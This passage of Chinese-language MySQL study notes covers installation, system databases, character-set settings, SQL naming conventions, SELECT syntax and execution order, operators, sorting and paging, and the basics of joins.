<li>特点：通常用于分析和存储随时间变化的数据，具有快速写入、实时分析和查询的能力。</li>
<li>典型产品：InfluxDB、TimeScaleDB（基于PostgreSQL的扩展）。</li>
</ul>
</li>
</ul>
<h3 id="关系型数据库详解"><a href="#关系型数据库详解" class="headerlink" title="关系型数据库详解"></a>关系型数据库详解</h3><p>E-R模型：Entity-Relationship 实体-联系模型</p>
<p><strong>ORM(Object Relational Mapping)思想</strong><br>数据库中的一个表和Java或Python中的一个类对应<br>表中的一条数据和类中的一个对象(或实体)对应<br>表中的某一列和类中的一个字段(属性)对应</p>
<p><strong>表的关联关系</strong><br>现实中的各种实体以及实体之间的联系均使用关系模型来表示<br>一点一：<br>一对多：<br>多对多：需要创建联接表<br>自我引用：</p>
<h3 id="MySQL的安装和卸载"><a href="#MySQL的安装和卸载" class="headerlink" title="MySQL的安装和卸载"></a>MySQL的安装和卸载</h3><p>卸载：<br>控制面板中卸载MySQL相关的软件；<br>清除C:\programData\MySQL中的配置信息和自己创建的文件（可不删除）；<br>清理环境变量；清理注册表；重启</p>
<p>参考<a href="https://www.bilibili.com/video/BV1iq4y1u7vj?p=7&spm_id_from=pageDriver&vd_source=20530c92c1be8bd70e37346e3a5c037a">MySQL安装卸载教程</a></p>
<h3 id="MySQL-基本介绍"><a href="#MySQL-基本介绍" class="headerlink" title="MySQL 基本介绍"></a>MySQL 基本介绍</h3><p><strong>基本功能命令：</strong></p>
<table>
<thead>
<tr>
<th>功能</th>
<th>命令</th>
</tr>
</thead>
<tbody><tr>
<td>登录</td>
<td>mysql -h localhost -P 3306 -u root -p <br> 客户端和服务器在同一机器时简写成：mysql -u root -p</td>
</tr>
<tr>
<td>查看版本</td>
<td>mysql -V or mysql –version</td>
</tr>
</tbody></table>
<p><strong>配置数据库详细功能</strong></p>
<table>
<thead>
<tr>
<th>数据库名称</th>
<th>数据库功能</th>
</tr>
</thead>
<tbody><tr>
<td>information_schema</td>
<td>包含了关于所有其他数据库的信息，如数据库中的表、列、数据类型、访问权限等元数据。<br>由MySQL服务器自动维护的。它对于数据库管理和查询元数据非常有用。</td>
</tr>
<tr>
<td>mysql</td>
<td>包含了MySQL服务器运行所必需的系统表，包括用户权限表、存储过程和事件等。<br>是MySQL的核心组成部分，不建议直接在这个数据库中创建或删除表。</td>
</tr>
<tr>
<td>performance_schema</td>
<td>用于监控MySQL服务器的性能。提供了丰富的数据来分析和优化MySQL服务器的性能<br>包含了各种性能指标的详细数据，如等待事件、锁信息、文件I&#x2F;O等。</td>
</tr>
<tr>
<td>sys</td>
<td>系统数据库，提供了对MySQL服务器性能的快速访问,包含了一系列视图和函数<br>这些视图和函数基于performance_schema和information_schema中的数据，但以一种更易于理解和使用的形式呈现。<br>通过使用sys数据库，可以更容易地诊断和解决MySQL服务器的性能问题。</td>
</tr>
<tr>
<td>sakila、world</td>
<td>示例数据库</td>
</tr>
</tbody></table>
<p><strong>MySQL数据目录结构</strong></p>
<p>C:\programData\MySQL\Data下存储系统自带和用户创建的数据库</p>
<p><strong>字符集</strong><br>MySQL5.0默认使用Latin字符集，不支持插入中文数据，查看和修改字符集的方法如下</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;character_%&#x27;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>修改 C:\programData\MySQL\下my.ini文件，在63行左右的<code>[mysql]</code>和76行左右的<code>[mysqld]</code>分别添加后重启：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">（63处添加）</span><br><span class="line">default-character-set = utf8</span><br><span class="line">（76处添加）</span><br><span class="line">character-set-server = utf8</span><br><span class="line">collation-server = utf8-general-ci</span><br></pre></td></tr></table></figure>


<p>*<strong>数据库对象</strong></p>
<table>
<thead>
<tr>
<th>数据对象</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>表(TABLE)</td>
<td>表是存储数据的逻辑单元，以行和列的形式存在，列就是字段，行就是记录</td>
</tr>
<tr>
<td>数据字典</td>
<td>就是系统表，存放数据库相关信息的表。系统表的数据通常由数据库系统维护，程序员通常不应该修改，只可查看</td>
</tr>
<tr>
<td>约束(CONSTRAINT)</td>
<td>执行数据校验的规则，用于保证数据完整性的规则</td>
</tr>
<tr>
<td>视图(VIEW)</td>
<td>一个或者多个数据表里的数据的逻辑显示，视图并不存储数据</td>
</tr>
<tr>
<td>索引(INDEX)</td>
<td>用于提高查询性能，相当于书的目录</td>
</tr>
<tr>
<td>存储过程(PROCEDURE)</td>
<td>用于完成一次完整的业务处理，没有返回值，但可通过传出参数将多个值传给调用环境</td>
</tr>
<tr>
<td>存储函数(FUNCTION)</td>
<td>用于完成一次特定的计算，具有一个返回值</td>
</tr>
<tr>
<td>触发器(TRIGGER)</td>
<td>相当于一个事件监听器，当数据库发生特定事件后，触发器被触发，完成相应的处理</td>
</tr>
</tbody></table>
<h3 id="数据库和表的导入导出"><a href="#数据库和表的导入导出" class="headerlink" title="数据库和表的导入导出"></a>数据库和表的导入导出</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">source Source<span class="operator">-</span>address</span><br><span class="line"><span class="comment">-- source d:\workEnglish\testdb.sql</span></span><br><span class="line"><span class="comment">-- 可在主界面执行，导入原数据库</span></span><br><span class="line"><span class="comment">-- 或在某数据库中执行，复制源数据库数据到当前数据库并导入原数据库</span></span><br></pre></td></tr></table></figure>


<h3 id="MySQL中的数据类型"><a href="#MySQL中的数据类型" class="headerlink" title="MySQL中的数据类型"></a>MySQL中的数据类型</h3><p>参见《MySQL数据类型》专项笔记</p>
<h3 id="图形化界面工具的使用"><a href="#图形化界面工具的使用" class="headerlink" title="图形化界面工具的使用"></a>图形化界面工具的使用</h3><p><a href="https://www.bilibili.com/video/BV1iq4y1u7vj?p=10&spm_id_from=pageDriver&vd_source=20530c92c1be8bd70e37346e3a5c037a">参考视频</a></p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ol>
<li>说说你了解的常见的数据库<ul>
<li>Oracle、MySQl、SQL Server、DB2、PGSQL；Redis、MongoDB、ES…..</li>
</ul>
</li>
<li>谈谈你对MySQL历史、特点的理解<br> 历史：<br> 由瑞典的MySQL AB 公司创立，1995开发出的MySQL<br> 2008年，MySQL被SUN公司收购<br> 2009年，Oracle收购SUN公司，进而Oracle就获取了MySQL<br> 2016年，MySQL8.0.0版本推出<br> 特点：<br> 开源的、关系型的数据库<br> 支持千万级别数据量的存储，大型的数据库</li>
<li>说说你对DB、DBMS、SQL的理解<br> DB：database，看做是数据库文件。 （类似于：.doc、.txt、.mp3、.avi、。。。）<br> DBMS：数据库管理系统。（类似于word工具、wps工具、记事本工具、qq影音播放器等）<br> MySQL数据库服务器中安装了MySQL DBMS,使用MySQL DBMS 来管理和操作DB，使用的是SQL语言。</li>
<li>你知道哪些非关系型数据库的类型呢？（了解）<br> 键值型数据库：Redis<br> 文档型数据库：MongoDB<br> 搜索引擎数据库：ES、Solr<br> 列式数据库：HBase<br> 图形数据库：InfoGrid</li>
<li>表与表的记录之间存在哪些关联关系？<br> ORM思想。（了解）<br> 表与表的记录之间的关系：一对一关系、一对多关系、多对多关系、自关联 （了解）</li>
<li>安装好MySQL之后在windows系统中哪些位置能看到MySQL?<br> MySQL DBMS软件的安装位置。 D:\develop_tools\MySQL\MySQL Server 8.0<br> MySQL 数据库文件的存放位置。 C:\ProgramData\MySQL\MySQL Server 8.0\Data<br> MySQL DBMS 的配置文件。 C:\ProgramData\MySQL\MySQL Server 8.0\my.ini<br> MySQL的服务（要想通过客户端能够访问MySQL的服务器，必须保证服务是开启状态的）<br> MySQL的path环境变量</li>
<li>卸载MySQL主要卸载哪几个位置的内容？<br> 使用控制面板的软件卸载，去卸载MySQL DBMS软件的安装位置。<br> D:\develop_tools\MySQL\MySQL Server 8.0<br> 手动删除数据库文件。 C:\ProgramData\MySQL\MySQL Server 8.0\Data<br> MySQL的环境变量<br> MySQL的服务进入注册表删除。（ regedit ）<br> 务必重启电脑</li>
<li>能够独立完成MySQL8.0、MySQL5.7版本的下载、安装、配置 （掌握）</li>
<li>MySQL5.7在配置完以后，如何修改配置文件？<br> 为什么要修改my.ini文件？ 默认的数据库使用的字符集是latin1。我们需要修改为：utf8<br> 修改哪些信息？<br> 修改完以后，需要重启服务。</li>
<li>熟悉常用的数据库管理和操作的工具<br>方式1：windows自带的cmd<br>方式2：mysql数据库自带的命令行窗口<br>方式3：图形化管理工具：Navicat、SQLyog、dbeaver等。</li>
</ol>
<h2 id="SQL语言规范"><a href="#SQL语言规范" class="headerlink" title="SQL语言规范"></a>SQL语言规范</h2><h3 id="SQL语言的规则与规范"><a href="#SQL语言的规则与规范" class="headerlink" title="SQL语言的规则与规范"></a>SQL语言的规则与规范</h3><p><strong>基本规则</strong></p>
<ul>
<li>SQL 可以写在一行或者多行。为了提高可读性，各子句分行写，必要时使用缩进</li>
<li>每条命令以 ; 或 \g 或 \G 结束</li>
<li>关键字不能被缩写也不能分行</li>
<li>关于标点符号<ul>
<li>必须保证所有的()、单引号、双引号是成对结束的</li>
<li>必须使用英文状态下的半角输入方式</li>
<li>字符串型和日期时间类型的数据可以使用单引号（’ ‘）表示</li>
<li>列的别名，尽量使用双引号（” “），而且不建议省略as</li>
</ul>
</li>
</ul>
<p><strong>SQL大小写规范 （建议遵守）</strong></p>
<ul>
<li>MySQL 在 Windows 环境下是大小写不敏感的</li>
<li>MySQL 在 Linux 环境下是大小写敏感的(数据库名、表名、表别名、变量名)<ul>
<li>数据库名、表名、表的别名、变量名是严格区分大小写的</li>
<li>关键字、函数名、列名(或字段名)、列的别名(字段的别名) 是忽略大小写的。</li>
</ul>
</li>
<li>推荐采用统一的书写规范：<ul>
<li>数据库名、表名、表别名、字段名、字段别名等都小写</li>
<li>SQL 关键字、函数名、绑定变量等都大写</li>
</ul>
</li>
</ul>
<p><strong>注释</strong><br>可以使用如下格式的注释结构</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 单行注释（仅mysql）</span><br><span class="line"><span class="comment">/*多行注释*/</span></span><br><span class="line"><span class="comment">-- 单行注释</span></span><br></pre></td></tr></table></figure>

<p><strong>命名规则</strong></p>
<ul>
<li>数据库、表名不得超过30个字符，变量名限制为29个</li>
<li>必须只能包含 A–Z, a–z, 0–9, _共63个字符</li>
<li>数据库名、表名、字段名等对象名中间不要包含空格</li>
<li>同一个MySQL软件中，数据库不能同名；同一个库中，表不能重名；同一个表中，字段不能重名</li>
<li>必须保证你的字段没有和保留字、数据库系统或常用方法冲突。如果坚持使用，请在SQL语句中使<br>用&#96;（着重号）引起来</li>
<li>保持字段名和类型的一致性，在命名字段并为其指定数据类型的时候一定要保证一致性。假如数据<br>类型在一个表里是整数，那在另一个表里可就别变成字符型了</li>
</ul>
<p><strong>标识符命名规则</strong></p>
<ul>
<li>数据库名、表名不得超过30个字符，变量名限制为29个</li>
<li>必须只能包含 A–Z, a–z, 0–9, _共63个字符</li>
<li>数据库名、表名、字段名等对象名中间不要包含空格</li>
<li>同一个MySQL软件中，数据库不能同名；同一个库中，表不能重名；同一个表中，字段不能重名</li>
<li>必须保证你的字段没有和保留字、数据库系统或常用方法冲突。如果坚持使用，请在SQL语句中使用&#96;（着重号）引起来</li>
<li>保持字段名和类型的一致性：在命名字段并为其指定数据类型的时候一定要保证一致性，假如数据类型在一个表里是整数，那在另一个表里可就别变成字符型了</li>
</ul>
<h3 id="阿里数据库规范"><a href="#阿里数据库规范" class="headerlink" title="阿里数据库规范"></a>阿里数据库规范</h3><p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240804180925.png" alt="阿里规范"></p>
<h2 id="DML-SELECT使用"><a href="#DML-SELECT使用" class="headerlink" title="DML-SELECT使用"></a>DML-SELECT使用</h2><h3 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h3><p>dual 伪表：<code>select 1+1 from dual</code></p>
<p>查看全部数据：<code>select * from tableName</code></p>
<p>查询某几列数据：<code>select column1,column2 from tableName</code></p>
<p>去除重复行：<code>select distinct col1 from tableName</code><br>distinct作用与选定的所有行，当某行一样而其他行不一样时不会过滤</p>
<p>列的别名(alias)：<code>select col1,col2 as alias1,alisa2 col3*2 as &quot;alias3&quot;, from tableName</code><br>说明：</p>
<ol>
<li>列的别名应当使用<code>&quot;</code>包裹，当由单个单词组成别名时，可以省略</li>
<li>当一个字段名紧跟其别名时，<code>as</code>可以省略:<code>select last_name name,salary*12 annual_salfrom employees</code></li>
<li>列名不一定要写在一起，可以写几个列名和其别名后再写几个，如上示例，但为方便查看，应当写完所有列名再写别名</li>
<li>别名可以用于order子句但不能用于where子句，因为where子句执行在select子句之前</li>
</ol>
<p>空值null参与运算：结果一定也是null</p>
<p><code>着重号</code>的使用：<br>当表名、列名等字段和关键字相同时，必须为字段添加``着重号</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> `<span class="keyword">order</span>`</span><br></pre></td></tr></table></figure>

<p>查询常数：<code>select &quot;武汉大学&quot; employee_id from tableName</code><br>会在查询结果中添加一列，每一行数据都标注“武汉大学”<br>+———-+————-+<br>| 武汉大学 | employee_id |<br>+———-+————-+<br>| 武汉大学 |         100 |<br>+———-+————-+</p>
<p>显示表结构：<code>describe tableName</code>简写<code>desc tableName</code><br>会显示表中所有字段的信息，包括字段名称，类型，是否为空，默认值，是否为主键外键</p>
<p>where过滤：<code>select * from tableName where name = &#39;King&#39;;</code><br>MySQL在windows下条件不区分大小写,但Oracle等数据库区分<br>where必须在from子句后</p>
<h3 id="语句结构和执行顺序"><a href="#语句结构和执行顺序" class="headerlink" title="语句结构和执行顺序"></a>语句结构和执行顺序</h3><h4 id="select语句结构"><a href="#select语句结构" class="headerlink" title="select语句结构"></a>select语句结构</h4><p>在无子查询的情况下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- sql92</span></span><br><span class="line"><span class="keyword">SELECT</span> ...,....,...</span><br><span class="line"><span class="keyword">FROM</span> ...,...,....</span><br><span class="line"><span class="keyword">WHERE</span> <span class="comment">-- 多表的连接条件,不可外连接</span></span><br><span class="line"><span class="keyword">AND</span> <span class="comment">-- 不包含组函数的过滤条件</span></span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> ...,...</span><br><span class="line"><span class="keyword">HAVING</span> <span class="comment">-- 包含组函数的过滤条件</span></span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> ... <span class="keyword">ASC</span><span class="operator">/</span><span class="keyword">DESC</span></span><br><span class="line">LIMIT ...,...</span><br><span class="line"></span><br><span class="line"><span class="comment">-- sql99</span></span><br><span class="line"><span class="keyword">SELECT</span> ...,....,...</span><br><span class="line"><span class="keyword">FROM</span> ... <span class="keyword">JOIN</span> ...</span><br><span class="line"><span class="keyword">ON</span> <span class="comment">-- 多表的连接条件</span></span><br><span class="line">(<span class="keyword">LEFT</span><span class="operator">/</span><span class="keyword">RIGHT</span>)<span class="keyword">JOIN</span> ...</span><br><span class="line"><span class="keyword">ON</span> ...</span><br><span class="line"><span class="keyword">WHERE</span> <span class="comment">-- 不包含组函数的过滤条件</span></span><br><span class="line"><span class="keyword">AND</span><span class="operator">/</span><span class="keyword">OR</span> <span class="comment">-- 不包含组函数的过滤条件</span></span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> ...,...</span><br><span class="line"><span class="keyword">HAVING</span> <span class="comment">-- 包含组函数的过滤条件</span></span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> ... <span class="keyword">ASC</span><span class="operator">/</span><span class="keyword">DESC</span></span><br><span class="line">LIMIT ...,...</span><br></pre></td></tr></table></figure>

<h4 id="SQL语句执行过程"><a href="#SQL语句执行过程" class="headerlink" title="SQL语句执行过程"></a>SQL语句执行过程</h4><p>关键字的书写顺序是不能颠倒的：<br><code>SELECT ... FROM ... WHERE ... GROUP BY ... HAVING ... ORDER BY ... LIMIT...</code><br><code>SELECT ...FROM ... JOIN ... ON ... WHERE ... GROUP BY ... HAVING ... ORDER BY ... LIMIT ...</code></p>
<p>SELECT 语句的执行顺序（在 MySQL 和 Oracle 中，SELECT 执行顺序基本相同）：<br><code>FROM -&gt; (ON)WHERE -&gt; GROUP BY -&gt; HAVING -&gt; SELECT 的字段 -&gt; DISTINCT -&gt; ORDER BY -&gt; LIMIT</code></p>
<h4 id="SQL-的执行原理"><a href="#SQL-的执行原理" class="headerlink" title="SQL 的执行原理"></a>SQL 的执行原理</h4><p><code>SELECT</code>是先执行<code>FROM</code>这一步的。在这个阶段，如果是多张表联查，还会经历下面的几个步骤：</p>
<ol>
<li>首先先通过<code>CROSS JOIN</code>求笛卡尔积，相当于得到虚拟表<code>vt（virtual table）1-1</code>；</li>
<li>通过<code>ON</code>进行筛选，在虚拟表<code>vt1-1</code>的基础上进行筛选，得到虚拟表<code>vt1-2</code>；</li>
<li>添加外部行。如果我们使用的是左连接、右链接或者全连接，就会涉及到外部行，也就是在虚拟表<code>vt1-2</code>的基础上增加外部行，得到虚拟表<code>vt1-3</code>。</li>
<li>如果我们操作的是两张以上的表，还会重复上面的步骤，直到所有表都被处理完为止。这个过程得到是我们的原始数据。</li>
<li>当我们拿到了查询数据表的原始数据，也就是最终的虚拟表<code>vt1</code>，就可以在此基础上再进行<code>WHERE</code>阶段 。在这个阶段中，会根据<code>vt1</code>表的结果进行筛选过滤，得到虚拟表<code>vt2</code>。</li>
<li>然后进入第三步和第四步，也就是<code>GROUP</code>和<code>HAVING</code>阶段 。在这个阶段中，实际上是在虚拟表<code>vt2</code>的基础上进行分组和分组过滤，得到中间的虚拟表<code>vt3</code>和<code>vt4</code>。</li>
<li>当我们完成了条件筛选部分之后，就可以筛选表中提取的字段，也就是进入到<code>SELECT</code>和<code>DISTINCT</code>阶段。首先在<code>SELECT</code>阶段会提取想要的字段，然后在<code>DISTINCT</code>阶段过滤掉重复的行，分别得到中间的虚拟表<code>vt5-1</code>和<code>vt5-2</code></li>
<li>当我们提取了想要的字段数据之后，就可以按照指定的字段进行排序，也就是<code>ORDER BY</code>阶段 ，得到虚拟表<code>vt6</code></li>
<li>最后在<code>vt6</code>的基础上，取出指定行的记录，也就是<code>LIMIT</code>阶段 ，得到最终的结果，对应的是虚拟表<code>vt7</code>。</li>
<li>我们在写<code>SELECT</code>语句的时候，不一定存在所有的关键字，相应的阶段就会省略。</li>
</ol>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> player_id, player_name, <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">as</span> num <span class="comment">-- 顺序 5</span></span><br><span class="line"><span class="keyword">FROM</span> player <span class="keyword">JOIN</span> team <span class="keyword">ON</span> player.team_id <span class="operator">=</span> team.team_id <span class="comment">-- 顺序 1</span></span><br><span class="line"><span class="keyword">WHERE</span> height <span class="operator">&gt;</span> <span class="number">1.80</span> <span class="comment">--  顺序 2</span></span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> player.team_id <span class="comment">-- 顺序 3</span></span><br><span class="line"><span class="keyword">HAVING</span> num <span class="operator">&gt;</span> <span class="number">2</span> <span class="comment">-- 顺序 4</span></span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> num <span class="keyword">DESC</span> <span class="comment">-- 顺序 6</span></span><br><span class="line">LIMIT <span class="number">2</span> <span class="comment">-- 顺序 7</span></span><br></pre></td></tr></table></figure>

<p><strong>非组函数过滤条件写在where比having快的原因</strong><br>where先执行，经过非组函数过滤条件过滤的虚拟表含有的数据更少，使得后续子句执行速度更快！</p>
<h3 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h3><h4 id="算术运算符-div-mod"><a href="#算术运算符-div-mod" class="headerlink" title="算术运算符 + - * &#x2F;(div) %(mod)"></a>算术运算符 + - * &#x2F;(div) %(mod)</h4><p>与非数值进行运算时会进行隐式转换，当无法转换时会按0处理<br>SQL中+只表示加法运算，如</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">100</span><span class="operator">+</span><span class="string">&#x27;1&#x27;</span>,<span class="number">100</span><span class="operator">+</span><span class="string">&#x27;a&#x27;</span> <span class="keyword">from</span> dual;</span><br><span class="line"><span class="comment">-- 101,100</span></span><br></pre></td></tr></table></figure>

<p>SQL中除法(<code>/</code>和<code>div</code>效果一样)默认保留四位小数，即使是整型中间的除法也会保留<br>当分母为0时，结果为NULL</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">100</span><span class="operator">/</span><span class="number">10</span>,<span class="number">100</span><span class="operator">/</span><span class="number">10.0</span>,<span class="number">100</span><span class="operator">/</span><span class="number">3</span>,<span class="number">100</span> div <span class="number">1</span>,<span class="number">100</span> div <span class="number">0</span> <span class="keyword">from</span> dual;</span><br><span class="line"><span class="comment">-- | 10.0000 |  10.0000 | 33.3333 |       100 |      NULL |</span></span><br></pre></td></tr></table></figure>

<p>取模运算(<code>%</code>和<code>mod</code>都可)：结果符号与被模数符号相同</p>
<h4 id="比较运算符"><a href="#比较运算符" class="headerlink" title="比较运算符"></a>比较运算符</h4><p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240801103242.png" alt="比较运算符"><br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240801113019.png" alt="比较关键字"></p>
<p>数值与非数值进行运算时会进行隐式转换，当无法转换时会按0处理</p>
<p>字符串和字符串进行比较运算时按ANSI的比较规则进行比较</p>
<p>只要有null参与运算，结果均为null<br><code>select last_name,commission_pct from employees where commission_pct = null;</code><br>改进：使用安全等于或<code>is null</code>关键字：<br><code>select last_name,commission_pct from employees where commission_pct &lt;=&gt; null;</code><br><code>select last_name,commission_pct from employees where commission_pct is null;</code></p>
<p><strong>is null和isnull()</strong><br><code>select last_name,commission_pct from employees where commission_pct is null;</code><br><code>select last_name,commission_pct from employees where  isnull(commission_pct);</code></p>
<p><code>between 条件1 and 条件2</code>包含边界，且条件1必须是较小的</p>
<p><code>LEAST()</code>和<code>GREATEST()</code><br>假设有一个名为 Products 的表，其中有两列 Price1 和 Price2，你想要找出这两个价格中的较小值：<br><code>SELECT ProductID, LEAST(Price1, Price2) AS LowestPrice FROM Products;</code></p>
<p><code>LIKE</code>模糊查询:</p>
<ul>
<li><code>%</code>表示0个或多个不确定字符</li>
<li><code>_</code>表示1个不确定的字符</li>
<li><code>\</code>转移字符<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> last_name <span class="keyword">from</span> employees <span class="keyword">where</span> last_name <span class="keyword">like</span> <span class="string">&#x27;%a%&#x27;</span>; <span class="comment">--包含a的</span></span><br><span class="line"><span class="keyword">select</span> last_name <span class="keyword">from</span> employees <span class="keyword">where</span> last_name <span class="keyword">like</span> <span class="string">&#x27;_e%&#x27;</span>; <span class="comment">--以e为第2个字符的</span></span><br><span class="line"><span class="keyword">select</span> last_name <span class="keyword">from</span> employees <span class="keyword">where</span> last_name <span class="keyword">like</span> <span class="string">&#x27;\_e%&#x27;</span>; <span class="comment">--以_e开头的</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h4><p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240801120940.png" alt="逻辑运算符"></p>
<h4 id="REGEXP、RLIKE-正则表达式匹配字符串"><a href="#REGEXP、RLIKE-正则表达式匹配字符串" class="headerlink" title="REGEXP、RLIKE 正则表达式匹配字符串"></a>REGEXP、RLIKE 正则表达式匹配字符串</h4><p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240801170016.png" alt="正则表达式"></p>
<ul>
<li><code>^</code>匹配以该字符后面的字符开头的字符串。</li>
<li><code>$</code>匹配以该字符前面的字符结尾的字符串。</li>
<li><code>.</code>匹配任何一个单字符。</li>
<li><code>[...]</code>匹配在方括号内的任何字符。例如，“[abc]”匹配“a”或“b”或“c”。为了命名字符的范围，使用一<br>个‘-’。“[a-z]”匹配任何字母，而“[0-9]”匹配任何数字。</li>
<li><code>*</code>匹配零个或多个在它前面的字符。例如，“x*”匹配任何数量的‘x’字符，“[0-9]<em>”匹配任何数量的数字，<br>而“</em>”匹配任何数量的任何字符。</li>
</ul>
<p>等价语句</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> last_name <span class="keyword">from</span> employees <span class="keyword">where</span> last_name regexp <span class="string">&#x27;^a&#x27;</span>;</span><br><span class="line"><span class="keyword">select</span> last_name <span class="keyword">from</span> employees <span class="keyword">where</span> last_name <span class="keyword">like</span> <span class="string">&#x27;a%&#x27;</span>;</span><br></pre></td></tr></table></figure>


<h4 id="位运算符和运算符优先级"><a href="#位运算符和运算符优先级" class="headerlink" title="位运算符和运算符优先级"></a>位运算符和运算符优先级</h4><p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240801165938.png" alt="位运算符"><br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240801121258.png" alt="运算符优先级"></p>
<h3 id="排序和分页"><a href="#排序和分页" class="headerlink" title="排序和分页"></a>排序和分页</h3><p>默认排序方式即为数据添加的顺序</p>
<h4 id="ORDER-BY-排序"><a href="#ORDER-BY-排序" class="headerlink" title="ORDER BY 排序"></a>ORDER BY 排序</h4><p>升序(asc):<code>select * from employees order by salary asc;</code>(order by默认排序方法)<br>降序(desc):<code>select * from employees order by salary desc;</code></p>
<p><strong>多列排序</strong>：先按 salary 升序排，salary一样按department_id降序排<br><code>select * from employees order by salary asc,department_id desc;</code></p>
<h4 id="LIMIT-分页"><a href="#LIMIT-分页" class="headerlink" title="LIMIT 分页"></a>LIMIT 分页</h4><p>便于查看，加快加载速度。<br>显示第n页，每页x条记录，则：<code>limit (n-1)*x,x</code><br>示例:<br>查看第1<del>20条记录：起始数据偏移，每页显示的条数<br><code>select last_name name,salary from employees limit 0,20;</code><br>查看第21</del>40条记录<br><code>select last_name name,salary from employees limit 21,20;</code></p>
<p><strong>MySQL8.0新特性-OFFSET关键字</strong><br>查看第21~40条记录<br><code>select last_name name,salary from employees limit 20 offset 21;</code></p>
<p>在MySQL，PostgreSQL，MariaDB和SQLite中使用limit关键字且需要放在select语句最末尾<br>在SQL Server和Access中使用top关键字，无需放到末尾：<br><code>select top 20 last_name ,salary from employees;</code><br>在DB2中，使用fetch first number rows only:<br><code>select last_name,salary from employees fetch first 20 rows only;</code><br>在Oracle中，使用rownum:<br><code>select rownum last_name ,salary from employees where rownum &lt;= 20;</code></p>
<h3 id="多表查询"><a href="#多表查询" class="headerlink" title="多表查询"></a>多表查询</h3><h4 id="基本规范"><a href="#基本规范" class="headerlink" title="基本规范"></a>基本规范</h4><p><code>select * from table1,table2 where table1.column = table2.column;</code></p>
<ol>
<li>查询时应当尽量指明所有字段所属的表,可以加快查询速度</li>
<li>多表共有字段必须指明所在的表</li>
<li>可以给表取别名（在from子句），此后其他子句是都必须所有表的别名，而不是表的原名<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> t1.employee_id,t2.department_name,t1.department_id </span><br><span class="line"><span class="keyword">from</span> employees t1,departments t2</span><br><span class="line"><span class="keyword">where</span> t1.department_id <span class="operator">=</span> t2.department_id;</span><br></pre></td></tr></table></figure></li>
</ol>
<p><strong>多表查询的父类</strong></p>
<ol>
<li>等值连接和非等值连接<ul>
<li>等值连接：<code>where t1.department_id = t2.department_id</code></li>
<li>非等值连接：<code>where t1.salary between t2.lowest_sal and j.highest_sal</code><br>员工表中含有员工工资，另一表中标注了某一级别工资上下界</li>
</ul>
</li>
<li>自连接和非自连接<ul>
<li>自连接：<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> t1.employee_id,t1.last_name,t2.employee_id,t2.last_name </span><br><span class="line"><span class="keyword">from</span> employees t1,employees t2 </span><br><span class="line"><span class="keyword">where</span> t1.manager_id <span class="operator">=</span> t2.employee_id</span><br><span class="line"><span class="comment">-- 查询员工及其管理者的信息，员工及其管理者均在员工表中</span></span><br></pre></td></tr></table></figure></li>
<li>非自连接：</li>
</ul>
</li>
<li>内连接(INNER JOIN 默认)和外连接(OUTER JOIN)</li>
</ol>
<h4 id="内连接和外连接"><a href="#内连接和外连接" class="headerlink" title="内连接和外连接"></a>内连接和外连接</h4><p>内连接（INNER JOIN）和外连接（OUTER JOIN）是数据库查询中常用的两种连接方式，它们用于将两个或多个表中的数据按照一定的条件进行关联，以形成所需的结果集。</p>
<p>内连接（INNER JOIN）只返回两个表中满足连接条件的行。具体而言，内连接根据指定的条件将两个表中的行进行比较，如果满足条件则将这些行组合成结果集中的一行。<br>特点：</p>
<ol>
<li>结果集：<strong>只包含符合连接条件的行</strong>。</li>
<li>操作方式：通过SELECT语句和FROM子句进行查询操作，连接条件通常在ON子句中指定。</li>
<li>优点：操作简单、效率较高。</li>
<li>缺点：可能会丢失不符合连接条件的数据。</li>
</ol>
<p>外连接（OUTER JOIN）返回两个表中的所有行，并根据连接条件进行匹配。与内连接不同，外连接<strong>不会剔除不符合连接条件的行</strong>，而是将它们保留在结果集中。外连接包括左外连接（LEFT OUTER JOIN）（保存左表不符条件的行）、右外连接（RIGHT OUTER JOIN）（保存右表不符条件的行）和全(满)外连接（FULL OUTER JOIN）（保存两表不符条件的行）。</p>
